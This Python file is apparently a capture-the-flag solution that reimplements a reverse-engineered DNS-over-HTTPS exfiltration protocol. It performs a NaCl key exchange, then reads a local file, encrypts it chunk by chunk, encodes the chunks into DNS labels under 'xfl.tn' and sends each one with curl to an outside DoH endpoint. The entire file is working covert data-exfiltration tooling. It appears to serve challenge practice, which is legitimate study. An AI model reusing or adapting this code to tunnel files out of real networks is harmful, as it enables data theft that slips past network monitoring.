import base64
import subprocess
import dns.message
import struct
import ipaddress
from nacl.secret import SecretBox
from nacl.exceptions import CryptoError
from nacl.public import PrivateKey, PublicKey, Box

# For UploadProtocol
import os
import hashlib
#from nacl.utils import random
from blake3 import blake3

class DoHProtocol:
    EXFIL_DOMAIN = "xfl.tn"

    def __init__(self, doh_endpoint: str = "https://target-exfil.chals.io/dns-query"):
        self.doh_endpoint = doh_endpoint

    def encode_base32hex_nopad(self, data: bytes) -> str:
        encoded = base64.b32hexencode(data).decode().rstrip("=").lower()
        #print(f"[+] Base32 Encoded DNS Label: {encoded}")
        #print(f"[+] Length of Base32 encoded DNS label = {len(encoded)}")
        return encoded

    def encode_query_base64url(self, query_bytes: bytes) -> str:
        b64url = base64.urlsafe_b64encode(query_bytes).decode().rstrip("=")
        #print(f"[+] Base64URL Encoded Query: {b64url}")
        return b64url

    def send_doh_query(self, encoded_query: str):
        url = f"{self.doh_endpoint}?dns={encoded_query}"
        print(f"[+] Sending request to:\n{url}\n")

        try:
            result = subprocess.run(["curl", "-s", "-H", "Accept: application/dns-message", url],
                                    capture_output=True)
            if result.returncode != 0:
                print(f"[!] Curl error: {result.stderr.decode()}")
                return None

            raw_response = result.stdout
            dns_response = dns.message.from_wire(raw_response)
            #print("[+] Parsed DNS Response:\n")
            #print(dns_response.to_text())
            return dns_response

        except Exception as e:
            print(f"[!] Error sending or parsing request: {e}")
            return None

    def extract_raw_chunks_from_aaaa(self, dns_response) -> bytes:
        indexed_chunks = []
        for rrset in dns_response.answer:
            if rrset.rdtype == 28:  # AAAA
                for rdata in rrset:
                    ipv6 = ipaddress.IPv6Address(rdata.address)
                    packed = ipv6.packed
                    index = packed[0]
                    chunk = packed[1:]
                    indexed_chunks.append((index, chunk))
                    print(f"[+] Index: {index:02x}, Chunk: {chunk.hex()}")

        indexed_chunks.sort(key=lambda x: x[0])
        ordered_chunks = [chunk for _, chunk in indexed_chunks]
        reconstructed = b''.join(ordered_chunks)
        print(f"[+] Reconstructed Chunks ({len(reconstructed)} bytes): {reconstructed.hex()}")
        return reconstructed

    def build_dns_query(self, domain: str, qtype: str = "AAAA") -> bytes:
        msg = dns.message.make_query(domain, qtype)
        packed = msg.to_wire()
        txn_id = struct.unpack("!H", packed[:2])[0]

        print(f"[+] DNS Query: {domain}, Type: {qtype}")
        #print(f"[+] Packed Length: {len(packed)} bytes")
        #print(f"[+] Transaction ID: {txn_id} (0x{txn_id:04X})")
        #print(f"[+] Raw Bytes: {packed.hex()}")
        return packed

class HelloProtocol:
    def __init__(self, doh: DoHProtocol):
        self.doh = doh
    
    def precompute_shared_key(self, client_private_bytes: bytes, server_public_bytes: bytes) -> bytes:
        """
        Precomputes the shared key using X25519 (ECDH) between client private key and server public key.

        Args:
            client_private_bytes (bytes): 32-byte private key
            server_public_bytes (bytes): 32-byte public key

        Returns:
            shared_key (bytes): 32-byte shared key used internally by NaCl Box
        """
        client_private = PrivateKey(client_private_bytes)
        server_public = PublicKey(server_public_bytes)
        box = Box(client_private, server_public)
        return box.shared_key()
    

    #Reverse: dVar3 = ((dword)(int)dVar15 & 0xff00ff00) >> 8 | ((dword)(int)dVar15 & 0xff00ff) << 8
    def untangle_session_and_timestamp(self, payload_hex: str):
        payload = bytes.fromhex(payload_hex)
        if len(payload) != 11:
            raise ValueError("Expected 11 bytes: 7-byte session ID + 4-byte timestamp")

        # Extract session ID
        #session_id = payload[:7].decode("ascii")
        session_id = payload[:7]

        # Extract timestamp (last 3 bytes + leading zero for 32-bit alignment)
        timestamp_bytes = b'\x00' + payload[8:]
        dVar15 = int.from_bytes(timestamp_bytes, byteorder='big')

        # Apply transformation
        timestamp = ((dVar15 & 0xff00ff00) >> 8) | ((dVar15 & 0x00ff00ff) << 8)

        return session_id, timestamp


    def decrypt_secretbox_from_raw_chunks(self, box_bytes: bytes, privatekey: bytes) -> bytes:
        """
        Decrypts a secretbox payload from raw IPv6 chunks.
        Assumes the first 24 bytes are the nonce.
        """
        if len(privatekey) != 32:
            raise ValueError("Private key must be 32 bytes.")

        if len(box_bytes) < 4:
            raise ValueError("Too short to contain length prefix.")

        N = int.from_bytes(box_bytes[0:4], "big")
        if N < 56:
            raise ValueError(f"Bad logical length N={N} (must be >= 56).")
        if len(box_bytes) < 4 + N:
            raise ValueError(f"Truncated: need {4+N} bytes, got {len(box_bytes)}.")

        # Split nonce and ciphertext
        # The data aligned towards the end!
        #print(f"[+] Prefix N: {N}")
        payload = box_bytes[4+11:15+N]
        publickey_server = payload[0:32]
        #Precompute Shared Key
        derived_shared_key = self.precompute_shared_key(privatekey, publickey_server)
        nonce = payload[32:56]
        ciphertext = payload[56:]  # N - 56

        #print(f"[+] Server's public key: {publickey_server.hex()}, len: {len(publickey_server)}")
        print(f"[+] Shared key: {derived_shared_key.hex()}, len: {len(derived_shared_key)}")
        #print(f"[+] Nonce: {nonce.hex()}, len: {len(nonce)}")    
        #print(f"[+] ciphertext: {ciphertext.hex()}, len: {len(ciphertext)}")

        box = SecretBox(derived_shared_key)
        try:
            plaintext = box.decrypt(ciphertext, nonce)
            print("[+] Decrypted secret box text:\n", plaintext.hex())
            return plaintext, derived_shared_key
        except CryptoError as e:
            raise RuntimeError(f"Decryption failed: {e}")


    def get_sessionid_and_sharedkey(self, dns_response, private_key: bytes, doh: DoHProtocol):
        raw_bytes = doh.extract_raw_chunks_from_aaaa(dns_response)
        decrypted_text, derived_shared_key = self.decrypt_secretbox_from_raw_chunks(raw_bytes, private_key)
        session_id, timestamp = self.untangle_session_and_timestamp(decrypted_text.hex())

        return session_id, timestamp, derived_shared_key

class UploadProtocol:
    CHUNK_SIZE = 124
    MAX_LABEL_LEN = 56
    MAX_DATA_LEN = 35 #before b32 encode
    RESP_SUCCESS = b'0000000109'

    def __init__(self, doh: DoHProtocol, session_id: str, timestamp: int, sharedkey: bytes):
        self.doh = doh
        self.session_id = session_id
        self.timestamp = timestamp
        self.sharedkey = sharedkey
        self.fd = 0
        self.findex = 0
        self.file_size = 0
        self.num_chunks = 0
        self.remain_byte = 0
        self.nonce = 0


    def b32hex_nopad(self, data: bytes) -> str:
        s = base64.b32hexencode(data).decode("ascii")
        return s.rstrip("=")

    def make_dns_labels_from_raw(self, raw: bytes, total_labels: int = 4) -> list[str]:
        """
        Build up to 4 DNS labels the way the server expects:
        - Split raw into 35-byte chunks.
        - Base32hex-encode each chunk (no '=')
        - If the final chunk is <35 bytes, its label will be <56 chars.
        Every remaining label after that must be the single char 'z'.
        - If all chunks are exactly 35 bytes, produce 56-char labels only (no 'z').
        """
        MAX_RAW_PER_LABEL = 35
        labels: list[str] = []

        print(f"[+] raw: {raw.hex()}, len: {len(raw)}")

        # Split into 35-byte chunks
        chunks = [raw[i:i+MAX_RAW_PER_LABEL] for i in range(0, len(raw), MAX_RAW_PER_LABEL)]
        
        if len(chunks) > total_labels:
            raise ValueError(f"Payload too large: needs {len(chunks)} labels (> {total_labels})")

        short_seen = False
        for idx, chunk in enumerate(chunks):
            if len(chunk) == 0:
                # Degenerate case: treat as short and force 'z' padding later
                short_seen = True
                break
            #enc = self.b32hex_nopad(chunk)
            enc = self.doh.encode_base32hex_nopad(chunk)
            labels.append(enc)
            if len(chunk) < MAX_RAW_PER_LABEL:
                # This label is short; all remaining labels must be 'z'
                short_seen = True
                break

        # If there are more raw chunks after a short, that's invalid (shouldn't happen)
        if short_seen and len(chunks) - 1 > len(labels) - 1:
            raise ValueError("Encountered a short label before the end of raw chunks")

        # Fill remaining labels:
        # - If short_seen: fill all remaining with a single 'z'
        # - Else: fill with nothing; but we must output exactly total_labels labels.
        while len(labels) < total_labels:
            if short_seen:
                labels.append("z")
            else:
                # No short label: we must have exactly total_labels full labels.
                # Emit empty only if we truly had fewer full chunks (caller should avoid this).
                # To be strict, raise if we don't have 4 full chunks.
                raise ValueError("Expected 4 full 56-char labels; got fewer")

        # Sanity: when no short label, every label must be exactly 56 chars.
        if not short_seen:
            for lab in labels:
                if len(lab) != 56:
                    raise AssertionError("Full labels must be exactly 56 chars")

        # Sanity: when short label present, first labels are 56 chars, last 'payload' label is <56,
        # all trailing labels are 'z'
        else:
            # All labels before the first non-56 must be 56
            for lab in labels:
                if lab == "z":
                    break
                if len(lab) not in (56,):  # allow the short label later
                    pass
            # Ensure trailing are 'z'
            z_started = False
            for lab in labels:
                if z_started:
                    if lab != "z":
                        raise AssertionError("All labels after the short one must be 'z'")
                else:
                    if lab != "z" and len(lab) < 56:
                        z_started = True  # from next label onward must be 'z'

        return labels



    def rotate_bytes(self, seqnum: int, num_bytes: int) -> bytes:
        """
        Performs a 16-bit rotation on a 32-bit integer:
        output = (seqnum >> 16) | (seqnum << 16)
        This reverse:
        1. seqnum = (*(dword *)(nonce + 3) & 0xff00ff00) >> 8 |
              (*(dword *)(nonce + 3) & 0xff00ff) << 8;
        2. *(dword *)((int)session_struct + 0x58) = seqnum >> 0x10 | seqnum << 0x10;

        """
        rotated = ((seqnum << 16) | (seqnum >> 16)) & 0xFFFFFFFF
        print(f"rotated = {rotated}/{hex(rotated)}")

        return rotated.to_bytes(num_bytes, byteorder='big')
    

    def get_chunk0(self, file_size: int, num_chunks: int, filehash: bytes) -> bytes:

        # Build the 24-byte metadata block
        chunk0 = (
            file_size.to_bytes(4, 'big') +
            num_chunks.to_bytes(4, 'big') +
            filehash  # 32 bytes
        )
        assert len(chunk0) == 40

        print("[+] chunk0: 4-byte file_size(big-endian) + 4-byte Number of chunks (big-endian) + 32 bytes file hash")
        print(f"[+] chunk0: {chunk0.hex()}, len: {len(chunk0)}")
        return chunk0
    
    def construct_sendbuf_nonce(self, session_id: bytes, chunk_index: int) -> bytes:

        #box = 24 bytes plaintext + 16 bytes MAC = 40 bytes

        nonce = self.session_id.ljust(20, b'\x00')  # Pad to 20 bytes with nulls
        nonce += chunk_index.to_bytes(4, 'big')
        nonce = nonce.ljust(24, b'\x00')
        
        return nonce

    def encrypt_with_secretbox(self, plaintext: bytes, sharedkey: bytes, chunk_index: int) -> bytes:
        # Generates a 24 bytes nonce
        #self.nonce = random(SecretBox.NONCE_SIZE)  # 24 bytes
        self.nonce = self.construct_sendbuf_nonce(self.session_id, chunk_index)
        print(f"[+] send buf nonce: {self.nonce.hex()}, len: {len(self.nonce)}")        

        # encrypt with secretbox
        box = SecretBox(sharedkey)
        encrypted = box.encrypt(plaintext, self.nonce)

        # return bytes with last 16 bytes of nonce + box
        return encrypted # This is already nonce-prefixed

    def pad_b32_payload_to_4_labels(self, b32_bytes: bytes) -> list[str]:
        """
        Pads base32 payload with '0' to reach 224 bytes (4 labels × 56 bytes).
        Returns a list of four 56-byte ASCII labels.
        """
        MAX_LABEL_LEN = 56
        TARGET_LEN = MAX_LABEL_LEN * 4

        # Convert to bytes if needed
        if isinstance(b32_bytes, str):
            b32_bytes = b32_bytes.encode("ascii")

        if len(b32_bytes) < TARGET_LEN:
            b32_bytes += b'0' * (TARGET_LEN - len(b32_bytes))

        # Split into four 56-byte labels
        labels = [b32_bytes[i:i + MAX_LABEL_LEN].decode("ascii") for i in range(0, TARGET_LEN, MAX_LABEL_LEN)]
        #labels = [b32_bytes[i:i + MAX_LABEL_LEN] for i in range(0, TARGET_LEN, MAX_LABEL_LEN)]
        return labels

    def split_into_4_dns_labels_and_base32encode(self, data: bytes):
        # Each dns label must be 56 bytes
        # Before b32encode, the data should be 35 bytes
        raw_dns_label = data
        target_len = self.MAX_DATA_LEN * 4
        if len(data) < target_len:
            raw_dns_label += b'0' * (target_len - len(data))

        # Split into four 35-byte labels
        labels = [raw_dns_label[i:i + self.MAX_DATA_LEN] for i in range(0, target_len, self.MAX_DATA_LEN)]

        # Base32 encode each lable
        encoded_labels = []
        for label in labels:
            encoded_labels.append(self.doh.encode_base32hex_nopad(label))

        print(f"Encoded_labels: {encoded_labels}")

        return encoded_labels

    def construct_multipart_dns_url(self, labels: bytes, session_id: str, chunk_index: int) -> str:
        #labels = self.pad_b32_payload_to_4_labels(labels)

        # Format chunk_index as 4-byte rotated hex string
        chunk_index_bytes = chunk_index.to_bytes(4, 'big')
        chunk_index_hex = chunk_index_bytes.hex()

        # Assemble full DNS domain
        domain_parts = labels + [chunk_index_hex, session_id, self.doh.EXFIL_DOMAIN]
        multipart_url = ".".join(domain_parts)

        return multipart_url
    

    def get_blake3_512(self, filepath: str) -> bytes:
        with open(filepath, "rb") as f:
            data = f.read()
        fullhash = blake3(data).digest(length=64)  # Full 64-byte digest
        return fullhash[:32] #return 32 bytes



    def transform_timestamp(self, timestamp: int):
        # Apply the custom transformation without truncating to 32 bits
        transformed = (
            (timestamp >> 0x18) |
            ((timestamp & 0xff0000) >> 8) |
            ((timestamp & 0xff00) << 8) |
            (timestamp << 0x18)
        )
        return transformed

    def print_debug_mesg(self, payload: bytes) -> bytes:
        opcode = int.from_bytes(payload[0:4], byteorder='big')
        error_code = int.from_bytes(payload[4:6], byteorder='big')
        error_bytes = payload[6:].rstrip(b'\x00')
        #error_string = error_bytes.decode('utf-8', errors='ignore')
        #error_string = payload.decode('utf-8', errors='ignore')

        print(f"[+] Opcode: {opcode:#04x} error code: {error_code}/{hex(error_code)}")
        #print(f"[+] Error message: {error_string}, len: {len(error_string)}")
        print(f"[+] Error messages: {error_bytes}, len: {len(error_bytes)}")
        return opcode, error_code



    def decrypt_secretbox_from_response(self, response: bytes) -> bytes:
        """
        Decrypts a secretbox payload from raw IPv6 chunks.
        Assumes the first 24 bytes are the nonce.
        """

        if len(response) < 4:
            raise ValueError("Too short to contain length prefix.")

        N = int.from_bytes(response[0:4], "big")

        # The data aligned towards the end!
        print(f"[+] Prefix N: {N}")
        payload = response[4:]
        print(f"[+] response: {response.hex()}, len: {len(response)}")

        ret_bytes = b''
        # For printing error
        if N <15:
            error_bytes = self.print_debug_mesg(payload[11:])
            """
            opcode = int.from_bytes(payload[11:15], byteorder='big')
            error_code = int.from_bytes(payload[15:17], byteorder='big')
            error_bytes = payload[17:].rstrip(b'\x00')
            #error_string = error_bytes.decode('utf-8', errors='ignore')
            error_string = payload.decode('utf-8', errors='ignore')

            print(f"[+] Opcode: {opcode:#04x} error code: {error_code}/{hex(error_code)}")
            print(f"[+] Error message: {error_string}, len: {len(error_string)}")
            print(f"[+] Error bytes: {error_bytes}, len: {len(error_bytes)}")
            """
            ret_bytes = error_bytes

        elif N >= 15:

            ciphertext = response[4+11:4+11+N]
            nonce = self.session_id.ljust(9, b'\x00')  # Pad to 8 + 1 bytes with nulls

            nonce_random = response[0:15]
            nonce += nonce_random #up to 16 bytes

            print(f"\n[+] Nonce:{nonce.hex()}, len: {len(nonce)}")
            print(f"[+] Ciphertext: {ciphertext.hex()}, len: {len(ciphertext)}")
            print(f"[+] Shared key: {self.sharedkey.hex()}, len: {len(self.sharedkey)}")

            box = SecretBox(self.sharedkey)
            try:
                plaintext = box.decrypt(ciphertext, nonce)
                print("[+] Decrypted secret box text:\n", plaintext.hex())
                opcode, error_code = self.print_debug_mesg(plaintext)
                ret_bytes = plaintext, opcode, error_code
            except CryptoError as e:
                raise RuntimeError(f"Decryption failed: {e}")
        
        return ret_bytes

    def get_chunk(self, i: int) -> bytes:
        """
        Reads chunk i (1-based index) from the file, computes a 32-byte BLAKE3 hash,
        and returns chunk_data + chunk_hash as bytes.
        """
        assert i >= 1 and i < self.num_chunks+1, f"Invalid chunk index: {i}"

        offset = (i - 1) * self.CHUNK_SIZE
        self.fd.seek(offset)
        chunk_data = self.fd.read(self.CHUNK_SIZE)

        chunk = chunk_data
        print(f"[+] Chunk {i}: {chunk.hex()}, len: {len(chunk)}")
        return chunk

    def upload(self):

        # Process Chunk i starting at 1
        for i in range(1, self.num_chunks+1):
            chunk = self.get_chunk(i)
            encrypted = self.encrypt_with_secretbox(chunk, self.sharedkey, i)
            packet_to_send = encrypted[24:]

            b32_encoded_labels = self.make_dns_labels_from_raw(packet_to_send, 4) 
            #print(f"[+] b32 encoded: {b32_encoded_labels}, len: {len(b32_encoded_labels)}")
            multipart_url = self.construct_multipart_dns_url(b32_encoded_labels, self.session_id.decode("ascii"), i)

            query_bytes = self.doh.build_dns_query(multipart_url)
            encoded_query = self.doh.encode_query_base64url(query_bytes)
            dns_response = self.doh.send_doh_query(encoded_query)
            raw_bytes = self.doh.extract_raw_chunks_from_aaaa(dns_response)
            plaintext, opcode, error = self.decrypt_secretbox_from_response(raw_bytes)

            #if (opcode!=1):
            #    exit(1)

        print("[+] Completed!")
        
        return


    def sendfile(self, filename: str):
        self.fd = open(filename, "rb")

        self.file_size = os.path.getsize(filename)
        self.num_chunks = self.file_size//self.CHUNK_SIZE
        self.remain_byte = self.file_size % self.CHUNK_SIZE
        if (self.remain_byte  > 0):
            self.num_chunks = self.num_chunks + 1

        print(f"[+] File size: {self.file_size}/{hex(self.file_size)} bytes,\
            Chunk size: {self.CHUNK_SIZE},\
            Total number of chunks: {self.num_chunks}/{hex(self.num_chunks)},\
            Last chunk(in bytes) = {self.remain_byte}")

        filehash = self.get_blake3_512(filename)
        chunk0 = self.get_chunk0(self.file_size, self.num_chunks, filehash)
        
        # Return box only (24 + 16 MAC) = 40
        encrypted = self.encrypt_with_secretbox(chunk0, self.sharedkey, 0)

        # Send the encrypted box only
        packet_to_send = encrypted[24:]
        print(f"[+] encrypted chunk0: {packet_to_send.hex()}, len: {len(packet_to_send)}")
        
        chunk_index = 0
        b32_encoded_str = self.make_dns_labels_from_raw(packet_to_send, 4) 
        print(f"[+] b32 encoded: {b32_encoded_str}, len: {len(b32_encoded_str)}")
        multipart_url = self.construct_multipart_dns_url(b32_encoded_str, self.session_id.decode("ascii"), chunk_index)


        print(f"[+] multi-part url: {multipart_url}, len: {len(multipart_url)}")

        query_bytes = self.doh.build_dns_query(multipart_url)
        encoded_query = self.doh.encode_query_base64url(query_bytes)
        dns_response = self.doh.send_doh_query(encoded_query)
        raw_bytes = self.doh.extract_raw_chunks_from_aaaa(dns_response)
        plaintext, opcode, error = self.decrypt_secretbox_from_response(raw_bytes)

        if (opcode!=1 or error !=9):
            exit(1)

        # Read for upload
        self.upload()
